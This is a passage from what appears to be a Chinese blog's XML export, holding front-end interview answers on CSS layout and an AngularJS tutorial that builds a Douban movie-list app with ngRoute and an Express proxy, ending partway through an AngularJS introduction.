IE6下使用gif图片 40、对 WEB 标准以及 W3C 的理解与认识 标签闭合标签小写不乱嵌套提高搜索机器人搜索几率使用外链css和js脚本结构行为表现的分离文件下载与页面速度更快内容能被更多的用户所访问内容能被更广泛的设备所访问更少的代码和组件容易维护改版方便不需要变动页面内容提供打印版本而不需要复制内容提高网站易用性 41、前端页面由什么构成 结构层 Html 表示层 CSS 行为层 js 42、如何居中 div, 如何居中一个浮动元素给 div 设置一个宽度，然后添加 margin:0 auto 属性 1234div&#123; width:200px; margin:0 auto;&#125; 居中一个浮动元素确定容器的宽高 宽 500 高 300 的层, 设置层的外边距 12345678.div &#123; width:500px ; height:300px; /* 高度可以不设 */ margin: -150px 0 0 -250px; position:relative; /*相对定位*/ background-color:pink; /*方便看效果*/ left:50%; top:50%; &#125; 43、display的值和作用、position的值block 像块级元素一样显示 none 缺省值 inline-block 像行内元素一样显示，但其内容像块类型元素一样显示 list-item 像块类型元素一样显示，并添加样式列表标记。 position的值 absolute 生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。 fixed （老IE不支持） 生成绝对定位的元素，相对于浏览器窗口进行定位。 relative 生成相对定位的元素，相对于其正常位置进行定位。 static 默认值。没有定位，元素出现在正常的流中 忽略 top, bottom, left, right z-index 声明 inherit 规定从父元素继承 position 属性的值。 44、absolute 的 containing block 计算方式跟正常流有什么不同 lock-level boxes 一个 block-level element (‘display’ 属性值为 ‘block’, ‘list-item’ 或是 ‘table’) 会生成一个 block-level box，这样的盒子会参与到 block-formatting context (一种布局的方式) 中。 block formatting context 在这种布局方式下，盒子们自所在的 containing block 顶部起一个接一个垂直排列 水平方向上撑满整个宽度 (除非内部的盒子自己内部建立了新的 BFC) containing block 一般来说，盒子本身就为其子孙建立了 containing block，用来计算内部盒子的位置、大小 对内部的盒子，具体采用哪个 containing block 来计算，需要分情况来讨论： 若此元素为 inline 元素， 则 containing block 为能够包含这个元素生成的第一个和最后一个 inline box 的 padding box (除 margin, border 外的区域) 的最小矩形； 否则则由这个祖先元素的 padding box 构成。 根元素所在的 containing block 被称为 initial containing block，在我们常用的浏览器环境下，指的是原点与 canvas 重合，大小和 viewport 相同的矩形； 对于 position 为 static 或 relative 的元素，其 containing block 为祖先元素中最近的 block container box 的 content box (除 margin, border, padding 外的区域)； 对于 position:fixed 的元素，其 containing block 由 viewport 建立； 对于 position:absolute 的元素，则是先找到其祖先元素中最近的 position 属性非 static 的元素，然后判断： 如果都找不到，则为 initial containing block。 45、b 标签和 strong 标签, i 标签和 em 标签的区别后者有语义，前者则无]]></content>
      <categories>
        <category>题库系列</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>CSS</tag>
        <tag>HTML</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AngularJS 框架]]></title>
    <url>%2F2016%2F03%2F18%2FAngularJS%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[豆瓣电影列表项目说明 使用 AngularJS + Bootstrap + Node.js 构建的一个电影列表展示单页应用 启动项目1$ nodemon add.js 或者： 1$ node add.js 豆瓣开发接口 API 所有的接口地址都是以：http://api.douban.com/v2 开头的 正在热映 http://api.douban.com/v2/movie/in_theaters 即将上映 http://api.douban.com/v2/movie/coming_soon top250 http://api.douban.com/v2/movie/top250 search http://api.douban.com/v2/movie/search?q={text} 电影条目接口: http://api.douban.com/v2/movie/subject/:id 项目骨架 app app.js app.css index.html in_theaters view.html module.js coming_soon view.html module.js top250 view.html module.js READMO.md .gitignore .editorconfig bower.json .bowerrc 页面开发流程：(一)、构建页面（bootstrap）选择模板 –&gt; 列表组 –&gt; 媒体组件 模板页面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;title&gt;豆瓣电影列表&lt;/title&gt; &lt;link href="node_modules/bootstrap/dist/css/bootstrap.css" rel="stylesheet"&gt; &lt;link href="css/main.css" rel="stylesheet"&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class="navbar navbar-inverse navbar-fixed-top" role="navigation"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="#"&gt;豆瓣电影列表&lt;/a&gt; &lt;/div&gt; &lt;div id="navbar" class="navbar-collapse collapse"&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt;&lt;a href="#"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;form class="navbar-form navbar-right" &gt; &lt;input type="text" class="form-control" placeholder="Search..."&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;div class="container-fluid"&gt; &lt;div class="row"&gt; &lt;div class="col-sm-3 col-md-2 sidebar"&gt; &lt;ul class="nav nav-sidebar"&gt; &lt;li class="active"&gt;&lt;a href="#"&gt;正在热映&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;即将上映&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;Top250&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"&gt; &lt;!-- 每一页不同的部分 --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; (二)、模块划分 中间变化部分每一个对应一个视图： view.html 和 模块 module.js in-theaters 正在热映视图、正在热映控制器、正在热映对应的模型代码 coming-soon 即将上映视图、即将上映控制器、即将上映对应的模型代码 top250 top250视图、top250控制器、top250模型代码 局部 HTML 发生变化。 路由： Node 中的路由：后台接收请求，渲染了了不同的页面。 前端路由，当点击一个连接的时候，显示不同的页面，不需要后台，前端也可以渲染，无非前端的路由变成了哈希值了。 主模块：–&gt; view 里放变化的中间的内容：怎么放？怎么加载？点击即将上映，局部 HTML 发生变化。–&gt; 前端路由 123&lt;div ng-view class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"&gt; &lt;!-- 每一页不同的部分 --&gt;&lt;/div&gt; 这回是前端路由，前端的路由变成了 hash 值。 view.html 中放中间变化的内容 1234567891011121314151617181920212223242526&lt;!-- 每页不同部分 --&gt;&lt;h1 class="page-header"&gt;header&lt;/h1&gt;&lt;!-- 列表组 --&gt;&lt;div class="list-group"&gt; &lt;a href="#/subject/&#123;&#123;movie.id&#125;&#125;" class="list-group-item" &gt; &lt;!-- 媒体组件 --&gt; &lt;div class="media"&gt; &lt;div class="media-left"&gt; &lt;img src="..." alt="..."&gt; &lt;/div&gt; &lt;div class="media-body"&gt; &lt;h4 class="media-heading"&gt;&#123;&#123; movie.title &#125;&#125;&lt;/h4&gt; &lt;p&gt;类型：剧情、爱情、同性 &lt;/p&gt; &lt;p&gt;导演：&lt;span&gt;陈凯歌&lt;/span&gt;&lt;/p&gt; &lt;p&gt;主演：&lt;span&gt;张国荣&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt;&lt;/div&gt;&lt;p&gt;总共：1条记录，第1/8页&lt;/p&gt;&lt;nav&gt; &lt;ul class="pager"&gt; &lt;li&gt;&lt;a href="#"&gt;上一页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;下一页&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; ★★★★★★★★★★★★★★★★★★ 在 angular 中使用路由，ng 官方提供了一个 ngRoute 模块。 (1)、视图(v)-页面 1234567891011121314&lt;!-- ... --&gt;&lt;body ng-app="DemoApp"&gt; &lt;header&gt; &lt;h1&gt;ng 中的路由模块 ngRoute 的使用&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;div&gt; &lt;!-- 这里是主页面中需要改变的内容 --&gt; &lt;/div&gt; &lt;/article&gt; &lt;footer&gt; &lt;p&gt;这里是页面脚部&lt;/p&gt; &lt;/footer&gt;&lt;/body&gt; (2). 安装包 12$ npm install --save angular$ npm install --save angular-route (3). 在视图页面中引包 12&lt;script src="node-modules/angular/angular.js"&gt;&lt;/script&gt;&lt;script src="node-modules/angular-route/angular-route.js"&gt;&lt;/script&gt; (4). 创建模块 使用 Angular 的依赖模块 ngRoute ngRoute 官方文档 1234567891011121314151617181920212223242526272829303132333435363738394041// 加载专门处理路由的 ngRoute 模块angular.module('DemoApp', ['ngRoute']) .config(['$routeProvider', function ($routeProvider) &#123; $routeProvider // 请求这个路径的时候，访问 a.html，把哪个控制器作用的这个视图上 .when('/in_theaters:id', &#123; // 渲染哪个页面 templateUrl: 'a.html', // 把哪个控制器作用到了视图上 controller: 'DemoAController' &#125;) .when('/coming_soon', &#123; templateUrl: 'b.html', controller: 'DemoBController' &#125;) .when('/top250', &#123; templateUrl: 'c.html', controller: 'DemoCController' &#125;) // 当匹配不到以上路径的时候，让它跳转 .otherwise(&#123; redirectTo: '/in_theaters' &#125;); &#125;]) .controller('DemoAController', ['$scope', function ($scope) &#123; $scope.title = 'AAA'; &#125;]) .controller('DemoBController', ['$scope', function ($scope) &#123; $scope.movie = &#123; src: 'https://img3.doubanio.com/view/movie_poster_cover/ipst/public/p2392444121.jpg', name: '神奇动物在哪里' &#125;; &#125;]) .controller('DemoCController', ['$scope', function ($scope) &#123; $scope.fruits = [ '苹果', '香蕉', '橘子', '菠萝' ]; &#125;]); (5). 控制器作用到视图 a.html 页面需要一个 title &lt;h2&gt;AngularJS 项目流程&lt;/h2&gt; b.html 页面需要一个src &lt;img ng-src=&quot;&quot; alt=&quot;&quot; /&gt; &lt;h4&gt;&lt;/h4&gt; c.html 页面需要列表 &lt;li ng-repeat=&quot;fruit in fruits track by $index&quot;&gt;&lt;/li&gt; (6). 作用到主页面视图-ng-view 12345678910111213&lt;body ng-app="DemoApp"&gt; &lt;header&gt; &lt;h1&gt;ng 中的路由模块 ngRoute 的使用&lt;/h1&gt; &lt;/header&gt; &lt;article&gt; &lt;div ng-view&gt; &lt;!-- 这里是主页面中需要改变的内容 --&gt; &lt;/div&gt; &lt;/article&gt; &lt;footer&gt; &lt;p&gt;这里是页面脚部&lt;/p&gt; &lt;/footer&gt;&lt;/body&gt; ★★★★★★★★★★★★★★★★★★ (三)、模块划分-控制器-路由通过主模块加载 3 个小模块 主页面： index.html 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt; &lt;head&gt; &lt;!-- ... --&gt; &lt;/head&gt; &lt;!-- 指定入口标识 --&gt; &lt;body ng-app="movie.main"&gt; &lt;nav class="navbar navbar-inverse navbar-fixed-top" role="navigation"&gt; &lt;!-- ... --&gt; &lt;/nav&gt; &lt;div class="container-fluid"&gt; &lt;div class="row"&gt; &lt;div class="col-sm-3 col-md-2 sidebar"&gt; &lt;ul class="nav nav-sidebar"&gt; &lt;li class="active"&gt;&lt;a href="#/in_theaters"&gt;正在热映&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#/coming_soon"&gt;即将上映&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#/top250"&gt;Top250&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;!-- 作用到当前视图 --&gt; &lt;div ng-view class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"&gt; &lt;!-- 每一页不同的部分 --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 引包 --&gt; &lt;script src="node_modules/angular/angular.js"&gt;&lt;/script&gt; &lt;script src="node_modules/angular-route/angular-route.js"&gt;&lt;/script&gt; &lt;!-- 页面中引入包 --&gt; &lt;script src="in_theaters/module.js"&gt;&lt;/script&gt; &lt;script src="coming_soon/module.js"&gt;&lt;/script&gt; &lt;script src="top250/module.js"&gt;&lt;/script&gt; &lt;script src="app.js"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 主模块： app.js 123456789101112131415161718192021222324// 主模块加载其它模块，就可以使用别的模块中的控制器了angular.module('movie.main', ['movie.in_theaters', 'movie.comming_soon', 'movie.top250', 'movie.detail',]) // 设置路由 .config(['$routeProvider', function($routeProvider)&#123; $routeProvider .when('/in_theaters', &#123; // 渲染这个视图 templateUrl: 'in_theaters/view.html', // 调这个控制器 controller: 'InTheaterController' &#125;) .when('/coming_soon',&#123; templateUrl: 'coming_soon/view.html', controller: 'ComingSoonController' &#125;) .when('/top250',&#123; templateUrl: 'top250/view.html', controller: 'Top250Controller' &#125;) // 是指跳转到当前路由了 .otherwise(&#123; redirectTo: '/in_theaters' &#125;) &#125;]) 正在上映模块：/in_theaters/module.js 123456(function (angular) &#123; angular.module('movie.in_theaters', []) .controller('InTheaterController', ['$scope',function ($scope) &#123; $scope.title = 'Loading...'; &#125;]);&#125;)(angular); 即将上映模块：/comming_soon/module.js 123456(function (angular) &#123; angular.module('movie.comming_soon',[]) .controller('ComingSoonController', ['$scope', function($scope)&#123; $scope.title = '即将上映'; &#125;]);&#125;)(angular); top250 模块 /top250/module.js 123456(function (angular) &#123; angular.module('movie.top250',[]) .controller('Top250Controller', ['$scope', function($scope)&#123; $scope.title = 'Top250'; &#125;]);&#125;)(angular); (四)、绑定假数据主页面视图：static/index.html 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt; &lt;head&gt; &lt;!-- ... --&gt; &lt;/head&gt; &lt;body ng-app="movie.main"&gt; &lt;nav class="navbar navbar-inverse navbar-fixed-top" role="navigation"&gt; &lt;div class="container-fluid"&gt; &lt;!-- ... --&gt; &lt;div id="navbar" class="navbar-collapse collapse"&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt;&lt;a href="#"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;!-- 搜索功能 --&gt; &lt;form ng-submit="search()" ng-controller="searchController" class="navbar-form navbar-right" &gt; &lt;input type="text" ng-model="search_text" class="form-control" placeholder="Search..."&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;div class="container-fluid"&gt; &lt;div class="row"&gt; &lt;div class="col-sm-3 col-md-2 sidebar"&gt; &lt;!-- ng 指令是用来操作这个 ul 的，所以将指令加给它比较合适，指令这给主模块就可以了 --&gt; &lt;ul class="nav nav-sidebar" movie-active&gt; &lt;li class="active"&gt;&lt;a href="#/in_theaters"&gt;正在热映&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#/coming_soon"&gt;即将上映&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#/top250"&gt;Top250&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div ng-view class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"&gt; &lt;!-- 需要改变的内容 --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 页面中引入包 --&gt; &lt;!-- ... --&gt; &lt;script src="movie_detail/module.js"&gt;&lt;/script&gt; &lt;script src="app.js"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 其他模块视图：in_theaters/view.html 1234567891011121314151617181920212223&lt;h1 class="page-header"&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt;&lt;div class="list-group"&gt; &lt;a ng-repeat="movie in movie_list.subjects track by $index" href="#/subject/&#123;&#123;movie.id&#125;&#125;" class="list-group-item" &gt; &lt;div class="media"&gt; &lt;div class="media-left"&gt; &lt;img ng-src="&#123;&#123; movie.images.small &#125;&#125;" alt="&#123;&#123; movie.alt &#125;&#125;"&gt; &lt;/div&gt; &lt;div class="media-body"&gt; &lt;h4 class="media-heading"&gt;&#123;&#123; movie.title &#125;&#125;&lt;/h4&gt; &lt;p&gt;类型：&#123;&#123; movie.genres.join('、') &#125;&#125; &lt;/p&gt; &lt;p&gt;导演：&lt;span ng-repeat="director in movie.directors track by $index"&gt;&#123;&#123; director.name &#125;&#125; &#123;&#123; $last?"":"、" &#125;&#125; &lt;/span&gt;&lt;/p&gt; &lt;p&gt;主演：&lt;span ng-repeat="cast in movie.casts track by $index"&gt;&#123;&#123; cast.name &#125;&#125; &#123;&#123; $last?"":"、" &#125;&#125; &lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt;&lt;/div&gt;&lt;p&gt;总共：&#123;&#123; total &#125;&#125;条记录，第&#123;&#123; page &#125;&#125;/&#123;&#123; totalPage &#125;&#125;页&lt;/p&gt;&lt;nav&gt; &lt;ul class="pager"&gt; &lt;li ng-class="&#123;disabled:page === 1&#125;"&gt;&lt;a ng-click="go(page-1)" href=""&gt;上一页&lt;/a&gt;&lt;/li&gt; &lt;li ng-class="&#123;disabled:page === totalPage&#125;"&gt;&lt;a ng-click="go(page+1)" href=""&gt;下一页&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; 请求 API，将数据绑定到视图预备知识★★★★★★★★★★★★★★★★★★ ng 中的 $http 请求资源问题：豆瓣 API 不支持：$htpp.jsonp(&#39;http://api.douban.com/v2/movie/in_theaters?count=5&amp;callback=JSON_CALLBACK&#39;)。 12345678910111213141516171819202122(function (angular) &#123; angular.module('movie.in_theaters', []) .controller('InTheaterController', ['$scope', '$http', function ($scope, $http) &#123; $scope.title = 'Loading...'; $http // 跨域请求，直接用get 报错 // .get('http://api.douban.com/v2/movie/in_theaters?count=5') // ng 中的 jsonp .jsonp('http://api.douban.com/v2/movie/in_theaters?count=5&amp;callback=JSON_CALLBACK') // URL 变成了：http://api.douban.com/v2/movie/in_theaters?count=5&amp;callback=angular.callbacks._0 // 数据回来了，但是报了常见语法错误， // 返回的数据并没有拼接上： angular.callbacks._0，把里面的 . 改成下划线 _ 就可以拼接到数据前面了。 // 原因是豆瓣 API 不支持，豆瓣 API 中只包含数字、字母、下划线，长度不大于 50 // 解决：自己写一个 jsonp 方法 // 另一种方法：前后端分离：用 node 来请求数据，把项目跑到 node 里面，完全不用考虑跨域。 // node 做一个中间层，专门来做 UI 渲染 .then( function(data) &#123; console.log(data); &#125;); &#125; ]);&#125;)(angular); 前后端分离 a) 前后端分离 (1)、V + C 前端 视图 + 控制器(2)、M 后台 操作数据库(3)、C 可以实现加载任意 V，在 V 里通过 XMLHttpRequest 发送请求向，索取数据(4)、C 靠JS、CSS、HTML 是不能实现的(5)、为了实现 C 前端团队需要依赖于 Nodejs、PHP、Python 等后端语言(6)、前后端分离可以实现前后端完全解藕，使得后端数据更加稳定统一(7)、可能会引起跨域问题，解决办法：jsonp b) 前后端不分离 1) V = 前端 C + M = 后端 暴漏了 static 静态资源，所有的资源都可以直接访问 1234567891011var express = require('express'), path = require('path');var app = express();// 走前台不需要后台路由// app.get('/', funciton(req, res) &#123;// res.send('后台路由');// &#125;);// 由于 static 目录中有一个 index.html，当去访问 '/' 的时候，express 会自动将 static 目录下的 index.html 渲染app.use(experss.static(path.join(__dirname, static)));app.listen(4000, function() &#123; console.log('Server is running at port 4000');&#125;); node 不仅仅能作为一个服务器接收请求，还能主动去请求别人的服务器，完全不受跨域影响。让 Node 做一个中转层。 123456789101112// 使用 node 发送请求var http = require('http');// 不使用原生的 http，有更好的包 request 来解决http.get('http://api.douban.com/v2/movie/in_theaters?count=5', function(res) &#123; var rawData = ''; res.on('data', function(chunk) &#123; return rawData += chunk &#125;); res.on('end', function() &#123; console.log(JSON.parse(rawData)); &#125;);&#125;); request 包1$ npm install --save request ★★★★★★★★★★★★★★★★★★ (五)、请求 API，将数据绑定到视图 用 node 来请求数据，把项目跑到 node 里面，完全不用考虑跨域，node 做一个中间层，专门来做 UI 渲染。 安装 express1$ npm install express request --save Node 中转请求接口 app.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546var express = require('express');var config = require('./config');var request = require('request');// querystring.parse() 将查询字符串转成对象；querystring.stringify() 将对象转成查询字符串var qstring = require('querystring');var path = require('path');var app = express();// 暴漏静态资源// 由于 static 目录中有一个 index.html，所以访问 / 的时候，express 会自动将 static 目录下的 index.html 渲染app.use(express.static(config.staticPath));app.use(express.static(path.join(__dirname, 'node_modules')));// Node中转暴漏一个接口给前台// app.get('/in_theaters', function(req, response, next) &#123;// // 从豆瓣 API 拿数据，使用 request 包，不使用原生的 http// request('https://api.douban.com/v2/movie/in_theaters', function(err, res, body) &#123;// if (err) &#123;// throw err;// &#125;// // 拿到数据，响应给前台请求// if (res.statusCode === 200) &#123;// response.send(body);// &#125;// &#125;);// &#125;);// 上面这种方式可以变成下面这种方式：// Request 请求到的数据就是一个可读流，可以通过 pipe 管道顺着可读流发送数据// app.get('/in_theaters', function (req, res, next) &#123;// // 拿到了查询字符串// // console.log(req.query);// request(`https://api.douban.com/v2/movie/in_theaters?$&#123;qstring.stringify(req.query)&#125;`).pipe(res);// &#125;);// 获得所有页面的数据app.get('/movie/:category', function (req, res, next) &#123; // 拿到了查询字符串，req.query 是一个对象 // console.log(req.query); // qstring.stringify() 将一个对象转成查询字符串 request(`https://api.douban.com/v2/movie/$&#123;req.params.category&#125;?$&#123;qstring.stringify(req.query)&#125;`).pipe(res);&#125;);// 后台请求 电影条目 API 接口app.get('/movie/subject/:id', function(req, res, next) &#123; request(`https://api.douban.com/v2/movie/subject/$&#123;req.params.id&#125;`).pipe(res);&#125;);// 监听端口app.listen(config.port, config.host, function() &#123; console.log(`Server is running at port $&#123;config.port&#125;`);&#125;); 主模块 app.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 主模块加载其它模块，就可以使用别的模块中的控制器了angular.module(&apos;movie.main&apos;, [&apos;movie.in_theaters&apos;, &apos;movie.comming_soon&apos;, &apos;movie.top250&apos;, &apos;movie.detail&apos;,&apos;ngRoute&apos; ]) // 设置路由 .config([&apos;$routeProvider&apos;, function($routeProvider)&#123; $routeProvider // 请求首页时 .when(&apos;/&apos;, &#123; redirectTo: &apos;/in_theaters/1&apos; &#125;) // 为了避免路径匹配问题，将这个放到前面 .when(&apos;/subject/:id&apos;, &#123; templateUrl: &apos;movie_detail/view.html&apos;, controller: &apos;DetailController&apos; &#125;) // 路径中传页码 // ng 中的路由支持这样的形式和后台一样动态处理路由 // page 是定义路径的时候起的一个名字，会自动把模糊匹配路径解析出来，然后挂载到 $routeParams 中 // $routeProvider 支持 when() 方法中传 ? ，表示 0 次或多次 .when(&apos;/:category/:page?&apos;, &#123; // 渲染这个视图 templateUrl: &apos;in_theaters/view.html&apos;, // 调这个控制器 controller: &apos;InTheaterController&apos; &#125;) // 是指跳转到当前路由了 .otherwise(&#123; redirectTo: &apos;/in_theaters&apos; &#125;) &#125;]) // 解决详情页搜索问题 .controller(&apos;searchController&apos;, [&apos;$scope&apos;, &apos;$route&apos;,function($scope, $route) &#123; $scope.search_text = []; $scope.search = function()&#123; // console.log($scope.search_text); $route.updateParams(&#123; category: &apos;search&apos;, page:&apos;1&apos;, // 路由中，如果没有该路径参数，则更新一个不存在的路由参数，路由自动帮你变成查询字符串 q: $scope.search_text &#125;); &#125;; &#125;]) // 利用自定义指令解决导航栏状态切换 .directive(&apos;movieActive&apos;, [&apos;$location&apos;, function ($location) &#123; return &#123; link: function ($scope, iElm, iAttrs, controller) &#123; // 获取当前 url ，根据 url 找到对应的 li ，让 li 获得 active 样式，其它 li 去除 active $scope.$location = $location; $scope.$watch(&apos;$location.url()&apos;, function (newVal, oldVal) &#123; var currentUrl = newVal.split(&apos;/&apos;)[1]; // Array.from 可以将一个伪数组转换成一个真的数组 Array.from(iElm.find(&apos;a&apos;)).forEach(function (a) &#123; angular.element(a).parent().removeClass(&apos;active&apos;); if (a.hash.substr(2) === currentUrl) &#123; angular.element(a).parent().addClass(&apos;active&apos;); &#125; &#125;); &#125;); &#125; &#125;; &#125;]); 配置文件路径：123456const path = require('path');module.exports = &#123; port: 4000, host: '127.0.0.1', staticPath: path.join(__dirname, 'static')&#125;; 其它模块 module.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162(function (angular) &#123; angular.module('movie.in_theaters', []) .controller('InTheaterController', [ '$scope', '$http', // ng 中专门拿路由当中的请求参数的 '$routeParams', // ng 中专门处理路由的 '$route', function ($scope, $http, $routeParams, $route) &#123; // 给模型暴露数据 $scope.title = 'Loading...'; $scope.total = 0; $scope.movie_list = &#123;&#125;; // 上一页、下一页 var pageSize = 10; $scope.totalPage = 0; $scope.page = $routeParams.page ? parseInt($routeParams.page) : 1; // console.log($routeParams); // $http.get('/in_theaters', &#123; // // 需要查询字符串，查询第几页，get() 方法不支持这样配置 // data: &#123; // start: ($scope.page -1) * pageSize, // count: pageSize // &#125; // &#125;) // 以上 $http.get 不支持配置，使用 $http 来配置 $http(&#123; method: 'get', url:'/movie/' + $routeParams.category, // get 请求数据使用 params；post 请求使用 data 属性 params: &#123; // 请求开始的数据 start: ($scope.page -1) * pageSize, count: pageSize, // 这里的 q 只是针对 search 有效，如果不是 search，豆瓣会忽略 q: $routeParams.q &#125; &#125;) .then(function(data) &#123; var result = data.data; $scope.movie_list = result; $scope.title = result.title; $scope.total = result.total; $scope.totalPage = Math.ceil(result.total/pageSize); &#125;); $scope.go = function(page) &#123; // console.log(page) // 如果这个页面小于等于 0 了 或者 &gt; 最大页面时不去处理 if (page &lt;= 0 || page &gt; $scope.totalPage) &#123; return; &#125; // 路径中传页码 // 使用路由提供的 API 更新当前请求路径中的请求参数 // 只要更新了路由中的参数，当前页面中的路由会被重载 $route.updateParams(&#123; page: page &#125;); &#125; &#125; ]);&#125;)(angular); (六)、通过路由实现简单的分页传参功能路径中传页码，使用路由提供的 API 更新当前请求路径中的请求参数。 (七)、通过配置路由参数实现多模块重用ng 中和后台原理相似，都支持路由参数 (八)、利用自定义指令解决导航栏状态切换 在需要操作 DOM 时 (九)、解决详情页搜索问题总结 整个小项目工作流程 前台主模块加载其它模块并设置路由， 前台其它模块 module.js 中的 $http 发起请求 请求中转 app.js 中转 app.js 向后台（豆瓣 API）发起请求 再由中转 app.js 将数据响应给前台 module.js 前台数据绑定，渲染视图]]></content>
      <categories>
        <category>AngularJS系列</category>
      </categories>
      <tags>
        <tag>AngularJS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AngularJS 框架]]></title>
    <url>%2F2016%2F03%2F18%2FAngularJS%20%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[写在最前：由于 ng 的表达式和博客有冲突，所以除了代码块之外所有的大括号经过了 \ 转义！ Angular 介绍什么是框架和库库是由开发人员主动使用库里面提供的 API，完成代码功能逻辑 框架里面提供了各种各样的库，这些库可以调用使用，也可以由框架去调用使用 什么是 AngularJS 一款非常优秀的前端高级 JavaScript 框架 可以轻松构建 SPA 应用程序 通过 指令 扩展了 HTML，通过 表达式 绑定数据到 HTML 最大程度上解放了 DOM 操作 构建更加动感的 HTML 应用程序 AngularJS是为了克服HTML在构建应用上的不足而设计的。AngularJS有着诸多特性，最为核心的是： MVC 模块化 自动化双向数据绑定 语义化标签、依赖注入等等 为什么使用 Angular 以前我们是这样的： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;传统页面操作数据操作方式&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;input id="txt_value" type="number"&gt; &lt;input id="btn_add" type="button" value="增加"&gt; &lt;script&gt; (function(window, document) &#123; var txt = document.querySelector('#txt_value'); var btn = document.querySelector('#btn_add'); btn.addEventListener('click', function(e) &#123; var now = txt.value - 0; now = now + 1; txt.value = now; &#125;); &#125;)(window, document); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 以后将会是这样的： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;使用AngularJS实现自增功能&lt;/title&gt;&lt;/head&gt;&lt;body ng-app&gt; &lt;input type="number" ng-model="value"&gt; &lt;input type="button" ng-click="value=value+1" value="增加"&gt; &lt;script src="../bower_components/angular/angular.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; AngularJS 优缺点优点： AngularJS 模板功能强大丰富，自带了极其丰富的angular指令。 AngularJS 是完全可扩展的，与其他库的兼容效果很好，每一个功能可以修改或更换，以满足开发者独特的开发流程和功能的需求。 AngularJS 是一个比较完善的前端MVC框架，包含服务，模板，数据双向绑定，模块化，路由，过滤器，依赖注入等所有功能； AngularJS 是互联网巨人谷歌开发，这也意味着他有一个坚实的基础和社区支持。 缺点： AngularJS 强约束导致学习成本较高，对前端不友好。但遵守 AngularJS 的约定时，生产力会很高，对 后台服务器开发程序员友好。 AngularJS 不利于 SEO，因为所有内容都是动态获取并渲染生成的，搜索引擎没法爬取。 AngularJS 作为 MVVM 框架，因为实现了数据的双向绑定，对于大数组、复杂对象会存在性能问题。 AngularJS 使用场景 单页面应用程序 复杂的后台管理系统 CRUD（增加 Create、查询 Retrieve、更新 Update、删除 Delete） 繁杂的 DOM 操作处理的页面 Angular 是一个类 MVC 类结构的 JavaScript 框架，建议构建 CRUD 